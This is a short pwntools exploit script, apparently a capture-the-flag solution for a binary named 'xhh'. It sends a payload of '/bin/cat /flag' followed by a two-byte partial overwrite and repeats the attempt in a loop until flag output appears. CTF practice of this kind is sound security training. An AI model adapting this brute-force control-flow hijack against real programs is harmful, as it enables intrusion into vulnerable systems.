from pwn import *
context.log_level = 'debug'

payload = "/bin/cat /flag".ljust(0x10,'\x00')
payload += "\xe1\xa4"
while True:
	p = process("./xhh")
	# gdb.attach(p,"b *$rebase(0x1721)")
	p.send(payload)
	sleep(0.5)
	try:
		flag = p.recv()
	except:
		flag = ""
	if "{" in flag or "}" in flag or "flag" in flag:
		log.info("flag:"+flag)
		# print(flag)
		exit(0)
	else:
		p.close()
		sleep(2)